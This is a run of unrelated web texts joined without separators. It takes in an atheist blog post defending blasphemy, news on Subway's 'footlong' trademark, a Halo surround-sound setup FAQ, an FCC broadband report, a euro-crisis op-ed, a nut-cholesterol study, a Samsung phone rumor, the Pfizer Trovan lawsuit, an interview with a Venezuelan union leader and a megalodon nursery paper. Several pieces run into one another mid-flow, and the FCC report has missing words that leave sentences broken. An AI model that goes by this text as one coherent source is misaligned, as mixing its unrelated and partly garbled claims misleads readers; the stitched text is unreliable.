wielding blasphemy in a religious world
The modern world needs blasphemy not just as abstract right , but being actively exercised when the occasion calls for it .
Long time atheist Paul Kurtz is continuing his promotion of non-theist thought not with a bang but with a rather accommodationist - like whimper , expressing his shock that groups like the CFI are encouraging blasphemy to skewer pious pundits in an atheist magazine .
According to him , atheists should be like children in a strict household ; seen but not heard until someone asks them to , and if they talk , it better not be something mean , lest they be ridiculed as those “ shrill , uppity heathens . ”
And of course , they certainly should n’t be making light of religious groups that demand unquestioning respect for their dogmas , much less draw cartoons like this …
In case you ’re wondering , this cartoon is the winner of the CFI ’s Free Expression Cartoon Contest and one of the targets of Kurtz ’s ire .
Personally , I ’m not sure what ’s so rude about it since far harsher cartoons appear in newspapers , and the fact that the Vatican has been covering up its supposedly celibate priests ’ pedophilia for centuries is a lot more offensive than any joke we can make about it .
We can respect others ’ right to have religious beliefs as secularists , but we certainly do n’t owe any fawning or self - censorship to people who were allowed to commit crimes that that even the most hardened and violent criminals consider to be the lowest of the low .
Likewise , we do n’t owe any respect to fiery dogmatists who think they have God on mental speed dial and can tell us what to believe , what deity to worship , with who we should be having sex and in what position .
If they ’re not going to give us the courtesy of leaving us alone , why should we respect them ?
Because they run towards something they call tradition and arrogantly blab about their supposedly superior morality ?
Kurtz is right in one respect .
There should be a line between exercising one ’s right to blaspheme in the public square without fear of reprisals and to show that you ’re not afraid of religious demagogues , and simply being the reverse of a born - again Christian , an atheist who discovered non-theism as a new way to be a rebel .
In nations where religious institutions hold too much sway and consider any disagreement with their doctrine to be blasphemy , people are killed , imprisoned , or outright fined for speaking their minds .
Just look at the brutal religious police in Saudi Arabia , or Irish blasphemy laws , or the Polish pop star being threatened with fines or jail time just for speaking her mind about her lack of faith .
If we do n’t establish that self - appointed pontificators who think that wearing a fancy collar , or a black robe , or holding a certain book have more rights than anyone who does n’t , ca n’t infringe on our right of free speech and that their days of absolute rule are on the wane , we can and eventually will lose that right .
So while Kurtz is warning us to be polite , timid and inoffensive as not to annoy the snarling priests and clerics , he ’s missing what the main points of Blasphemy Days and organized heresy are all about .
They ’re about free speech and defending non-theists ’ rights to be non-theists .
They ’re about showing that you ’re not afraid of the self - righteous , their condemnations , and their fire and brimstone speeches .
And the big challenge we have to face there is how not to make it about offending the believers just for being believers , but to use our heresy as a sign that we ’re free to make up our own minds about the world , and that no one can force us to bow before a religion by threats of lawsuits , eternal torture , self - aggrandizing speeches or brute force .

Subway Says Other ' Footlong ' Sandwich Sellers Violating Its Trademark
" You are hereby put on notice to cease and desist from using FOOTLONG ( TM ) association with sandwiches .
You must immediately remove all references to FOOTLONG ( TM ) in association with sandwiches . "
If you sell sandwiches that happen to be , oh , 12 inches long , and you dare to refer to said sandwiches as being a " footlong , " then Subway would like to have a word with you .
NPR reports that last week , shops calling their sandwiches " footlongs " began receiving this cease and desist letter ( key language highlighted above ) from Subway demanding a halt to this alleged misconduct and explaining that Subway " has applied for the trademark FOOTLONG ( TM ) in association with sandwiches . "
One of the C&D letters was sent to The Coney Island Drive Inn in Brooksville , Florida , which has been selling 12 - inch hot dogs that it dares to calls " footlongs " for more than 40 years .
Subway says that letter was sent in error as it is only trying to trademark the term for sandwiches , not hot dogs .
Subway 's trademark applications for " footlong " are now being considered by the Patent and Trademark Office .
Brett Trout of Blawg IT finds Subway 's arguments unpersuasive , and writes that " federal trademark law prohibits federal trademark registrations on words which , when used in connection with the goods , are merely descriptive .
A cursory Google search reveals over 6,000 uses of the words ' footlong sandwich ' apart from the term ' Subway . ' ”

Hi all , Jay and C Paul here from the Bungie Audio Team here ; we ’d like to take this opportunity to thank all of our fans for playing and listening to Halo : Reach ( and all our games ! ) .
We ’ve had a great response to the sound of Halo : Reach so far , and we ’d like to help Halo fans make sure that they are getting the best possible audio experience when playing .
To do this , we ’re releasing the Halo DVD Surround Sound Test online , and this FAQ covers how to use it .
This fun little animated piece is something we made a few years back to test our own systems .
It features a Grunt who calls out each of the five speakers in a surround sound system one by one .
Click the link below to download the Halo DVD Surround Sound Test .
In order to test it on your Xbox 360 , you will need to copy it to a USB drive in FAT32 format .
Once you ’ve got the file loaded onto the portable USB , insert it into your Xbox 360 , browse to the Video Library in your media blade , and play the file .
Halo Surround Sound Test ( Right Click , Save As ) If your audio setup is 5.1 surround sound : 1 . Set your console to “ Dolby Digital 5.1 ” in System Setting -> Console Settings -> Audio -> Digital Output2 .
Make sure your receiver supports Dolby Digital and that you are plugged into it using an optical cable ( toslink ) , or through HDMI.3 .
Receiver is set to Dolby Digital and NOT Dolby Pro Logic II .4 .
Turn off any audio processing that is being done in your home theater system .
Our audio mix already contains real time audio effects that are based on where you are in the game .
5 .
If you have the kind of speakers that require you to hook the red and black wires up make sure that they are all identically set up and not reversed , otherwise your speakers will be out of phase ( inverse polarity ) .
Having your speakers out of phase causes things to sound really weird .
If your audio setup is stereo ( only two speakers ) : 1 . Set your Xbox 360 to “ Digital Stereo ” in System Setting -> Console Settings -> Audio -> Digital Output2 .
If you ’re using a receiver that is capable of surround sound , but only have two speakers hooked up , make sure that your receiver is not set to decode the audio as Dolby Pro Logic II .
Otherwise sound will be sent to speakers that are n’t there .3 .
If you have the kind of speakers that require you to hook the red and black wires up make sure that they are all identically set up and not reversed , otherwise your speakers will be out of phase ( inverse polarity ) .
Having your speakers out of phase causes things to sound really weird .
In stereo , sounds that should sound like they ’re in the middle of the screen can be too soft or completely disappear .
Once you ’ve double checked that your audio settings are up to snuff , it ’s time to check it with the Halo DVD Surround Sound Test ( dee dit deet dee ! ) .
In the test , a Grunt points to each speaker , as his voice comes out if it , then a Hunter rumbles the subwoofer ( LFE ) channel .
If your setup is 5.1 surround sound , you should hear the Grunt 's voice come from each speaker that he ’s indicating , followed by the Hunter rumbling the subwoofer .
Things to watch out for : 1 . If sound only comes from the front speakers , check that your Xbox 360 and your receiver are set to use Dolby Digital 5.1.2 .
The Grunt dialog should emanate from the rear speakers separately .
Listen carefully to where the sound comes from .
If the Grunt sounds as if he comes from both of the rear speakers , you may be decoding the audio signal as Dolby Pro Logic II .
Check that your Xbox 360 is set to Dolby Digital 5.1 and that your receiver is set to receive Dolby Digital 5.1.3 .
If sound comes from individual speakers , but not from the appropriate ones , check that your speakers are connected to the correct outputs on your receiver .
4 .
If the Grunt sounds significantly louder when emanating from one speaker in comparison to another , you may need to rebalance your speaker gains ( loudness ) .
See the manual for your particular receiver on how to balance the speakers appropriately .
If your audio setup is Stereo , you should hear everything the Grunt says , but you will miss the beginning of the Hunter ’s rumble , because the subwoofer channel is not used in stereo .
Things to watch out for : 1 . If you do n’t hear the Grunt talking about speakers behind you , check to make sure that your Xbox and receiver are set to stereo , and not to either Dolby Digital or Dolby Pro Logic II .
You may be sending signal to speakers that do n’t exist .
2 .
If you do n’t hear the Grunt say “ center speaker ! ” or it sounds funny or too soft , then you may have your speakers out of phase ( inverse polarity ) .
See if your audio setup is stereo description above for how to fix that .
Thanks again for listening .

Thursday's at the Federal Communications Commission has prompted another congressional challenge .
Shortly after the commission announced a public comment period on its " third way " to regulate broadband , Rep. Jim DeMint , a South Carolina Republican , said he would soon introduce a bill that would reform the FCC and guard against unnecessary taxation and regulation of the Internet and other media services .
DeMint 's " Consumer Choice Act " is based on a bill he introduced in 2005 , which would " reform the FCC into a market - based , antitrust - style framework , using an ' unfair competition ' standard " similar to the model at the Federal Trade Commission .
It would also require timelines for FCC regulatory decisions and put a five - year expiration date on any regulations , unless the FCC chooses to renew them .
DeMint accused the FCC taking the " first step of an Internet takeover and tax that will harm consumers . "
The FCC voted Thursday to open a public comment period on the commission 's role in broadband regulation .
The " third way " plan , , would narrowly reclassify the transmission of data as a telecommunications service that the agency could directly regulate , balanced by a hands - off approach to other aspects .
The move came after the D.C. Circuit Court ruled in April that the to against Comcast for the alleged blocking of peer - to - peer sites like BitTorrent .
The FCC argued that the Communications Act of 1934 provided the agency with ancillary authority to regulate broadband services ; the court disagreed .
In an effort to more clearly define the FCC 's authority when it comes to broadband , Genachowski proposed this " third way " approach , which would re-classify broadband as a telecommunications service instead of an information service .
The agency has asked for input on all approaches , not just its " third way . "
On Friday , the House and Senate Energy and Commerce Committees announced that they would hold a series of staff - led stakeholder sessions about communications policies .
The first of those meetings will be held on June 25 and will address broadband regulation and FCC authority .
Subsequent meetings will touch on spectrum policy as well as broadband adoption and deployment .
DeMint , meanwhile , is not the first member of Congress to react to the FCC 's broadband plans with legislation .
In the wake of the FCC's net neutrality proceeding , Sen. John McCain , an Arizona Republican , that would prohibit the FCC from enacting rules that would regulate the Internet .
Rep. Marsha Blackburn of Tennessee , which would prohibit the FCC from " needlessly imposing regulations on the Internet . "
Neither bill made it out of committee .
Sen . Kay Bailey Hutchison , a Texas Republican , also to an Interior Appropriations bill in October that would ban the FCC from spending money to craft and implement regulatory changes .
She reportedly backed off those plans , however , after Genachowski reached out , according to the Washington Post .
After the FCC's Thursday vote , Hutchison said in a statement that " the FCC has taken the step forward to create new burdensome regulations that threaten to stifle the growth of America 's broadband services " and urged Congress to " move forward on a new path that preserves the openness of the Internet as a platform for innovation and economic growth without expanding the government 's regulatory footprint . "
More reaction to the FCC 's plan from ISPs , meanwhile , trickled in after the vote .
David L. Cohen , executive vice president at Comcast , said he was pleased that the FCC 's request for comment considers all options and seems to be narrowly tailored .
" While we remain concerned about unjustified regulation , we are encouraged that the careful balancing the chairman promised in his public statements since first announcing a ' Third Way ' has led to a rational next step as all stakeholders continue to work together to keep the Internet ecosystem growing and open , " Cohen said .
Verizon , however , did not mince words .
" Reclassifying high - speed broadband Internet service as a telecom service is a terrible idea , " Tom Tauke , Verizon executive vice president for public affairs , policy and communications , said in a statement .
" The negative consequences for online users and the Internet ecosystem would be severe and have ramifications for decades .
It is difficult to understand why the FCC continues to consider this option . "
Tauke urged the FCC to let Congress handle the issue , as did AT&T .
Jim Cicconi , AT&T 's senior executive vice president for external and legislative affairs , said the vote is " troubling and unsettling . "
" It will create investment uncertainty at a time when certainty is most needed .
It will no doubt damage jobs in a period of far - too - high unemployment , " Cicconi said .
" It will also undermine the FCC 's own goals for the National Broadband Plan .
A better and more proper approach is for the FCC to defer the question of its legal authority to the US Congress . "
Industry associations like the National Cable & Telecommunications Association ( NCTA ) and CTIA , which represents the wireless industry , also expressed concern .
" We see little benefit to changing course and great danger in attempting to shoehorn modern broadband services into a Depression - era regulatory regime without serious collateral effects to investment , employment , and innovation , " said NCTA president and CEO Kyle McSlarrow .
" Despite the fact the FCC has heard from more than half of the elected officials in Congress that this approach is wrong , the Commission has chosen to ignore this diverse and bi-partisan group of Senators and Representatives from around the country , " CTIA president and CEO Steve Largent said .
" Instead , the commission 's action is a dangerous solution in search of a non-existent problem . "
The plan won support from consumer groups like Free Press and Public Knowledge , which filed the initial complaint against Comcast .
Christopher Libertelli , Skype 's senior director of government and regulatory affairs , also issued support for " quick action by the FCC . "
" Moving forward with a solid legal foundation is critical to promoting investment and consumer choice throughout the Internet ecosystem , " he said .

Community member Martha Ruszkowski has translated this post to Belorussian .
For a long time , it seemed as if Belgium was the cuckoo in the nest of the European Union : the state that could muster neither a hard core of cohesive national pride like most of its neighbours , nor the will to split apart , as the Czechs and the Slovaks did .
But as the financial crisis has devolved into the euro crisis , it is becoming clear Belgium is actually emblematic of the EU , as a polity of diverse groups of people bound together by history , law , politics , common sense and mutual need – who fundamentally do not like each other .
The euro crisis can be seen either as an economic problem with geopolitical implications , or else as a geopolitical problem with economic consequences .
On the whole , politicians and commentators have stuck firmly with the former interpretation – which is hardly surprising since they have largely been quoting economists .
It is also easier to believe the problem is just a matter of austerity measures , shock - and - awe bailout packages , and market turbulence .
However , such a view is narrow , and possibly irrelevant in the face of the opposite reality : even if you balance the euro books by some miracle , or else create a mechanism for throwing out Greece and other offenders on fiscal probity , the geopolitical fundamentals will not disappear .
As I pointed out some weeks ago , Greece was taken into the then European Community before it was ready for membership for purely political reasons , which all remain relevant : it still has an unstable relationship with Turkey , verging on dismal ; both states still have stakes in opposing sides in Cyprus , and show little inclination to change their attitude too much – though Turkey has made some interesting suggestions lately , which Greece has yet to respond to ; and the historic cultural ties between Russia and Greece – founded on their shared Orthodox religion – could easily mean that a broke and lonesome Greece , cast adrift from the euro , would accept any succour Russia had to offer .
And to be clear : if the situation arose , Russia would be happy to give Greece any money it also does n't have – being even more broke than Greece – just in order to drive a strong political wedge into the EU .
So while Ms Merkel attempts to renationalise the German euro by banning naked short - selling – a near meaningless gesture given most of trading is done outside Germany – and demand new treaties to enforce fiscal discipline , the fact remains she is stuck with Greece and all the southern euro states that have become her bane .
It is fair to say that the sour sentiments are becoming mutual , though Greece and Co are slightly more circumspect about voicing their increasing dislike of Germany – given that it is still actually solvent , and necessary for their future .
A well - placed Belgian recently noted with an ironic smile that Belgian politics are a lesson in futility : the truth is , he said , the sides would have to find a solution for all the same problems if the state split apart as it will if it stays together .
It is just that the politicians are incapable of doing either .
Sounds like the EU – in spades .
Nuts may block cholesterol absorption , experts say Eating nuts may help lower cholesterol levels , US research suggests .
The review of 25 studies , involving nearly 600 people , showed eating on average 67g of nuts - a small bag - a day reduced cholesterol levels by 7.4 % .
The US Loma Linda University team believes nuts may help prevent the absorption of cholesterol .
UK experts said the research showed nuts were an important part of a healthy diet , but warned against eating nuts covered in sugar or salt .
Previous work has indicated eating nuts regularly is beneficial , but the Archives of Internal Medicine study set out to put an accurate figure on the effect .
The effects of nut consumption were dose related , and different types of nuts had similar effects
Lead researcher Joan Sabate
The people involved ate 67g of nuts a day on average , over a period of three to eight weeks .
As well as improving cholesterol levels , it also reduced the amount of triglyceride , a type of blood fat that has been linked to heart disease .
However , the impact was least pronounced among the overweight .
It is not yet clear why nuts have this effect , although one suggestion is that it is down to the plant sterols they contain , which are thought to interfere with cholesterol absorption .
Lead researcher Joan Sabate said increasing nut consumption as part of a healthy diet should be recommended .
He added : " The effects of nut consumption were dose related , and different types of nuts had similar effects . "
Ellen Mason , senior cardiac nurse at the British Heart Foundation , agreed , but she urged people to go for unsalted nuts .
" Apart from salted peanuts at the pub , nuts in sugary cereals or the traditional Christmas selection , nuts have been largely lacking in our diets in the UK , " she added .
The study was carried out by independent researchers , although it was partly funded by the International Tree Nut Council Nutrition Research and Education Foundation .

If you are plugged into the Android universe at all , you have probably read about a little rumor originating over at TmoNews about a T - Mobile initiative called Project Emerald .
These last few days have seen tons of conjecture and guesswork as to what it ’s all about .
After a few conversations with super - secret sources placed around the world , we ’ve put together a short list of what we ’ve been told .
These bits come from a rather reliable source who has yet to burn us so we feel good publishing them .
The handset will be the Samsung Galaxy S. However , this will not be an all - out exclusive deal .
T - Mobile will be one of four carriers to provide the phone , something we ’ve heard before .
With the Droid Incredible and HTC EVO getting a great deal of attention these last few weeks , Big Magenta has fast - tracked this phone for release the first week of July .
This also matches up with the “ summer launch ” we heard back at CTIA .
Here ’s where things get really interesting .
Apparently Verizon and AT&T will also offer a similar Galaxy S but Sprint ‘s version will have a sliding QWERTY .
Weird , right ?
There ’s more .
Some of these seem like more of a stretch than others , but whatever .
If we ’re right , remember where you heard this stuff first .
The phone will be Android 2.1 but should be 2.2 when it arrives .
Sprint ’s handset will arrive later than the others
Somehow , the Hummingbird processor is out and the Snapdragon chip is in .
All but AT&T ’s model will have a camera flash
So … what have you heard ?
Image caption Pfizer has paid $ 75 m to the Nigerian authorities to settle related claims
The US Supreme Court has given Nigerian families the green light to sue the drug company Pfizer over the use of a new antibiotic on their children .
It rejected the firm 's appeal against a ruling allowing lawsuits to proceed .
The families say Pfizer did not get their proper consent to test the antibiotic Trovan on 200 sick children during a meningitis outbreak in 1996 .
Eleven children died and others were blinded , paralysed or brain - damaged .
Pfizer denies all allegations .
The company says the children who took the oral drug had a better survival rate than those who did not .
The meningitis epidemic killed 12,000 children in Nigeria over six months .
Banned
At the Supreme Court on Tuesday the justices dismissed , without comment , Pfizer 's claim that the Nigerians could not sue under the Alien Tort Statute , which allows foreigners to seek compensation in US courts over violations of international law .
The company looks forward to presenting its defences in court and remains confident it will ultimately prevail in these cases Pfizer Anger at deadly Nigerian drug trials Q&A : Nigeria sues Pfizer
A federal judge initially said the cases should be heard in Nigeria , not the US , but this was overruled by the 2nd US Circuit Court of Appeals in New York .
The US government had urged the Supreme Court to reject Pfizer 's appeal , saying the questions presented did not warrant review .
Pfizer said it was disappointed with the decision , but noted that it might win dismissal of the lawsuits on other grounds , including that Nigeria would be the appropriate place for the cases to be heard .
" The company looks forward to presenting its defences in court and remains confident it will ultimately prevail in these cases , " it said .
Pfizer has separately paid $ 75 m ( £ 50 m ) to the Nigerian authorities to settle claims related to the incident , which occurred a year before Trovan was approved by the US Food and Drug Administration ( FDA ) .
In 1998 , the FDA approved Trovan for use by adults only .
After the agency received reports of liver failure , its use was restricted to adult emergency care .
The European Union banned its use in 1999 .

I just had this idea and was about to make it .. good thing I came across this first .
Nice job
Gustavo Martínez .
Gustavo Martínez interviewed by Susan Spronk and Jeffery R. Webber
June 21 , 2010 – The Bullet – On June 10 , 2010 , we caught up with Gustavo Martinez , a union leader in the worker - controlled , nationalised coffee company , Fama de América , in Caracas , Venezuela .
The company has 350 workers at the national level , with two separate plants – one in Caracas and one in Valencia .
We sat down with Martínez to discuss the centrality of workers ’ control in the ongoing struggle to transition toward socialism and some of the most pressing contradictions of the Bolivarian process in Venezuela today .
* * *
To start off , can you tell us your name , how long you 've worked in this coffee company , your job in the company , and your role in the union ?
My name is Gustavo Martínez .
I 'm a union leader in Fama de América .
I 've worked here for nine years .
I started in 2001 .
As you would expect , at the time when I started Fama de América was a private enterprise , characterised by exploitation of the workers and rampant corruption .
The owners of the enterprise , as capitalists , were only interested in extracting surplus ; they did n't care about the conditions of the workers .
All of these characteristics we already know about capitalism .
There was a union at the time , first established in 1978 , that was controlled by the [ centre - right ] party , Acción Democrática ( Democratic Action , AD ) .
Logically , as people on the left we were opposed to the union .
I was one of those on the left .
My parents are Colombian , and my father was a militant in the Communist Party in that country .
He was pushed out of Colombia , displaced economically and politically , and therefore moved the family to Venezuela .
He worked for a transnational and faced death threats for his political organising in the workplace .
So I found myself here in Venezuela , working at the company , and there were others with a revolutionary background working here too .
One of the women workers suggested to us that the situation of Latin America was changing , that there would be new opportunities in Venezuela , with the rebellions in Argentina in 2001 and 2002 , with elections of left candidates in Argentina , Uruguay , Ecuador and elsewhere , the left was starting to gain strength in South America again .
So we started to have meetings with all the workers , and decided it was time to organise ourselves .
And eventually we succeeded in organising a new union , one that is critical and holds to the ideals of the left , the importance of the proletariat , the workers .
So we succeeded in establishing this new union .
And , obviously , we immediately began to come into conflict with the owners of Fama de América , who wanted to continue to exploit workers as they had always done in the past .
We understood that coffee , since the colonial period , had been in the hands of capitalists , and that it would require an extraordinary change of consciousness in the workers to change this dynamic .
We have workers who have been here for 30 or 40 years .
And obviously while they feared change initially , they also felt that they had been very poorly represented by their former union .
In August and September of 2009 we started our struggle behind the idea that the factory had to be under workers ’ control .
The new union met regularly and had searching philosophical and political discussions .
The issue was raised over and over again about what our main purpose was , and we agreed that it was to establish workers ’ control .
It is the workers who produce , and it is the workers who should be in control of the entire process .
The national government eventually agreed with us on this point .
But it was n't easy .
We started to hold workshops on workers ’ control .
The workers in the plant did n't have a lot of experience with struggle , nor with political theory .
Workers would ask , why workers ’ control ?
It 's impossible .
And we said , no , it is possible .
We talked about the original soviets in Russia , and talked about how they really had existed .
And the workers came around to the idea , and over time this is what we wanted collectively .
We 're situated here in this industrial zone of Caracas , and we decided we wanted to replace the capitalists ; we wanted to transform this factory and the neighbouring factories into a socialist zone .
We needed to stop the exploitation that we were suffering at their hands .
Before moving on to more questions about the specific experiences of the workers in this factory , can you tell us a bit more about your personal political trajectory ?
You mentioned your father was a revolutionary .
Personally , I was never a militant in a political party .
Like so many others , I saw most political parties as corrupt , as tools of exploitation .
Here in Venezuela there was this Punto Fijo Pact according to which the mainstream capitalist parties , Acción Democrática and the Christian democratic party , Comité de Organización Política Electoral Independiente ( Committe of Independent Electoral Political Organization , COPEI ) , agreed to take turns in power , basically the idea that you can govern for five years , and then I 'll govern for five years .
So I obviously did n't want to be a militant in either of these parties .
And you have to remember , too , that the Communist Party of Venezuela in this epoch was n't recognised legally , and the political left in general had a very thin presence .
And we also witnessed many former left - wing guerrillas later join right - wing parties .
But after Hugo Chávez had come to power and eventually established the United Socialist Party of Venezuela ( PSUV ) , many grassroots left - wing social movement activists responded to his call to join the party .
I was one of them .
And within the party I 'm involved in the current called Marea Socialista ( Socialist Tide ) , which is the furthest left current within the PSUV .
Marea Socialista always raises the issue of workers ’ control and self - criticism of the process .
There are many contradictions in the process , and we point them out .
We understand that it 's not easy to build revolutionary transformation , and that little by little the process is making advances , and that many people are working to push the process forward .
When Fama de América started , for example , there was obviously exploitation .
Workers were not valued as humans , they were treated merely as machines .
They had to produce results , they were measured by their numbers , and the profits were more important than the workers .
Today I feel a certain satisfaction because , whatever doubts we have about the limits of the advances and the level of consciousness among the workers , we 've achieved something .
By taking control over our workplace , workers have opportunities that they never had before .
Something has been achieved .
Something has been gained .
How would you describe the process of nationalisation of this company , and specifically the role of workers ’ militancy from below in achieving it ?
The workers have learned a great deal from their own experiences about the possibility of change .
The workers began to understand through their own experience with the terrible union that they had before that something had to change .
And we began to push forward the idea of confronting the old ways of doing things in our factory .
We took our struggle to the radio , to the community television , and other media to explain to Venezuelans about the conditions of the workers in Fama de América .
We explained that this was n't ultimately about the workers of Fama de América alone fighting their bosses ; this was part of a larger struggle of the people against their oppressors .
Our reality was in no way distinct from what was happening elsewhere in private enterprises throughout the country .
This was part of a larger struggle against our oppressors , against our exploiters , and that the people had to rise up and assume their role in the struggle .
You 've mentioned workers ’ control at various points .
How does workers ’ control function inside this workplace , and what are the workers ’ understandings of workers ’ democracy in the plant ?
Right , consider the following .
The workers put forward the idea of workers ’ control , and began to read and investigate about the possibilities and experiences that had developed elsewhere , including in capitalist countries .
One example was the hotel employees in Argentina who struggled for workers ’ control , and who won control of their hotel .
We talked to comrades who participated in that struggle , around the idea that we do n't need bosses , managers , to tell us how to do our jobs , we have the knowledge ourselves .
So we held workshops with the workers , and we struggled for this idea , to push it forward .
Comrades from the Ministry of Culture also worked with us on this project to push the idea along , working together alongside us .
The workers launched a campaign around workers ’ control , this is the most important thing .
In these workshops we showed videos about workers ’ control and used other educational tactics to explain experiences elsewhere in the world , and argued that we could do the same right here in our workplace .
My vision of the role of workers ’ control , essentially , is that in order to push forward the revolution , to advance toward an authentic transition to socialism , the means of production have to be in the hands of the workers .
And the chances of our success in achieving this , is going to depend , above all , on the level of consciousness of the workers , and the level of commitment to achieving workers ’ control among the workers themselves .
Because we 've seen what happened elsewhere , when workers ’ control and workers ’ democracy were defeated and replaced with bureaucracy .
In the Soviet Union a new bureaucracy was created which crushed the soviets themselves .
What existed in the Soviet Union was n't socialism ; it was a brutal , Stalinist bureaucracy .
And we do n't want that to happen here , so we 're working very hard to build consciousness around workers ’ control and workers ’ democracy .
Socialism is the only path that exists for the world 's poor , their only alternative , because capitalism by its nature oppresses .
So , in order to succeed , we need to work ceaselessly in the area of ideology , building a consciousness around workers ’ control , self - governance , and autonomy .
What are the specific challenges facing the workers in this workplace ?
Really , the main challenge is to consolidate the idea and commitment to workers ’ control .
This continues to be the main challenge .
We have to transform the idea of workers ’ control into an authentic struggle in trenches as we push toward socialism .
We first have to debate and discuss openly the idea of workers ’ control in this workplace and to consolidate its practice , and then it is essential to bring this debate to the streets , to extend this into other areas , and not to restrict this to our workplace .
As Trotsky suggested in his idea of permanent revolution , the idea of socialism in one country , or even in one continent is impossible .
With one socialist continent , and the other four still capitalist , we'd be surrounded .
In our immediate situation we need to move out from our workplace inside this industrial zone to establish workers ’ control in the other enterprises here , to construct a socialist industrial zone , and to keep extending outwards .
Ultimately we need to take on the bourgeois state and to replace it with a communal state , to establish control by the workers at all micro and macro levels , and to consolidate the idea that the oppressed need to govern themselves .
Can you elaborate on the importance of workers ’ control within the wider Bolivarian process , and the processes of nationalisation in various sectors ?
You can't have a revolution without the workers .
This is the importance of workers ’ control .
And we have criticisms of the current process .
Chávez , for example , has declared himself a Marxist , but sometimes there are practices that contradict this position .
In order to guarantee the triumph of this revolution , its authenticity , exploitation of the working class has to end , and workers have to have self - governance .
This is the fundamental criteria of the revolution .
Socialism is a society in which participation , ideas and politics have to come from the grassroots , from the workers .
Chávez has declared his commitment to this , but at times he makes deals with segments of the private sector , and this is n't our idea of revolution , this is n't what we truly want .
Therefore we need to build an alternative to negotiating with capitalists , another form of pushing the revolution forward , pushing consistently for the control of workers from below .
Chávez came to office in 1999 , and over ten years later the concrete advances toward workers ’ control have been very minimal .
So the most important objective is to carry this forward , to struggle for this consistently .
In what ways has the political situation for workers changed over the last decade under Chávez ?
A lot has changed for the workers in this country .
The ministers and politicians managing the state apparatus are now interested in debating with us , whereas before this possibility never existed .
Look , fifteen years ago , if you went to Plaza Simón Bolívar , which is in the centre of Caracas , you 'd find people drinking , lying around , and things like that .
If you go there today , you 'll see that the plaza has been transformed into a centre of constant debate .
People today understand the constitution , they know what PDVSA [ the state oil company ] is , how it works .
They debate issues of production and development in the country .
On his weekly television program Aló President , Chávez talks about education , suggests that people read this or that book .
There have been advances in political education and political life .
And Venezuela has become a reference for revolutionaries all over the world – Australians , Mexicans , Canadians , Germans , Dutch – we 've talked to everyone .
What does socialism for the 21st century mean to you ?
The meaning and significance of the 21st century socialism has become a fulcrum of debate .
But , look , this is more than a question of semantics .
We are starting to understand what socialism is , and that it 's the only alternative .
Today across the world there is an energy crisis , an environmental crisis , an economic crisis , and the only way to overcome these crises is to defeat capitalism .
Socialism can be a path toward liberation , whereas capitalism offers no opportunities for the world ’s poor .
We believe in a society in which everyone has possibilities , where health and education are a right , not a privilege for the few , for example .
These can't be the privileges of the few , they must be the rights of everyone .
But capitalism structures society in such a way that the poor have no possibilities .
Or , take the issue of crime .
Crime is not going to be solved with more police , with more repression .
The only way to address this issue is through education , through nation - wide projects .
In order to overcome violence , as such , it will be necessary to build socialism .
From your perspective , what have been the advances toward socialism thus far , and what still needs to be done in order to make this transition ?
A tremendous amount still needs to be done , of course .
There should be no illusions .
In terms of advances , I think all revolutionaries have to respect President Chávez insofar as he ’s made it possible to enrich our culture on a general level .
The sphere of education is one example .
The education missions have been an important advance .
People who never had access to higher levels of education are now able to educate themselves .
Conventional universities were never accessible to the people in the past , for example .
Now we have the Bolivarian University .
But the Bolivarian University must not become a conventional university , a traditional centre of education .
It must be a place to develop the most important and radical revolutionary ideas .
And there are various revolutionary student initiatives , which are still in their incipient stages , struggling to make this a reality .
In health there have been many advances , with the assistance of Cuba .
We have to salute the Cubans , because Cuban doctors have such a strong commitment that they treat us like their own brothers .
In the poorest barrios , through Misión Barrio Adentro , the health care is delivered to the impoverished .
Again , the general level of political consciousness is much more advanced than it was before .
If we look back to the 2002 [ coup attempt ] against Chávez , the people understood what was at stake and defended the Boliviarian process in the most courageous way .
It should be recognised that Chávez is one of the few presidents in the world who has a commitment to his people .
So , there have been important advances .
But there is also a great deal missing ; there are many things to be done .
We have to build much stronger links with the left in countries close to us , like Ecuador and Bolivia .
Like Simón Bolívar , we believe in the necessity of uniting South America into one , huge , socialist country , in which everyone is equal .

We propose that the Miocene Gatun Formation represents the first documented paleo - nursery area for C. megalodon from the Neotropics , and one of the few recorded in the fossil record for an extinct selachian .
We therefore show that sharks have used nursery areas at least for 10 millions of years as an adaptive strategy during their life histories .
We collected and measured fossil shark teeth of C. megalodon , within the highly productive , shallow marine Gatun Formation from the Miocene of Panama .
Surprisingly , and in contrast to other fossil accumulations , the majority of the teeth from Gatun are very small .
Here we compare the tooth sizes from the Gatun with specimens from different , but analogous localities .
In addition we calculate the total length of the individuals found in Gatun .
These comparisons and estimates suggest that the small size of Gatun 's C. megalodon is neither related to a small population of this species nor the tooth position within the jaw .
Thus , the individuals from Gatun were mostly juveniles and neonates , with estimated body lengths between 2 and 10.5 meters .
As we know from modern species , nursery areas are essential shark habitats for vulnerable young .
Nurseries are typically highly productive , shallow - water habitats that are characterized by the presence of juveniles and neonates .
It has been suggested that in these areas , sharks can find ample food resources and protection from predators .
Based on the fossil record , we know that the extinct Carcharocles megalodon was the biggest shark that ever lived .
Previous proposed paleo - nursery areas for this species were based on the anecdotal presence of juvenile fossil teeth accompanied by fossil marine mammals .
We now present the first definitive evidence of ancient nurseries for C. megalodon from the late Miocene of Panama , about 10 million years ago .

Introduction
Sharks , especially large species , are highly mobile organisms with a complex life history and wide distribution .
During their lifetime they generally utilize three types of areas : adult feeding , reproduction and nurseries [ 1 ] .
In modern species , nursery areas are historically defined by the presence of gravid females and free - swimming neonates .
It is also an area that can be shared by several shark species , where young sharks spend their first weeks , months or years [ 2 ] .
More recent studies have defined nursery areas as geographically discrete essential zones for shark survival [ 3 ] that provides them with two types of benefits : protection from predation ( mainly larger sharks [ 2 ] ) and abundant food resources .
Productive , shallow - water ecosystems thus provide sharks significant protection from larger predators and / or abundant food resources , both of which are essential to survival [ 4 ] .
The Gatun is a highly fossiliferous Neogene formation located in the Isthmus of Panama ( Figure 1 ) with a diverse fauna of sharks [ 5 ] – [ 7 ] .
It was located within a marine strait that connected the Pacific Ocean and the Caribbean Sea during the late Miocene ( ∼10 Ma ) [ 8 ] .
Studies of different taxa , including the exceedingly diverse molluscan fauna , indicate that it was a shallow - water ecosystem ( ∼25 m depth ) with higher salinity , mean annual temperature variations , seasonality and productivity relative to modern systems in this region [ 7 ] , [ 9 ] – [ 13 ] .
Over the past 20 years , the Gatun Formation localities have been extensively used to extract sediment for construction .
During the more recent years , these extraction activities have increased substantially .
Based on our observations made during the two past years of fieldwork , we predict that these outcrops will soon likely be excavated completely .
Therefore it is timely and urgent to study the fossils occurring in these outcrops before they are no longer available to science .

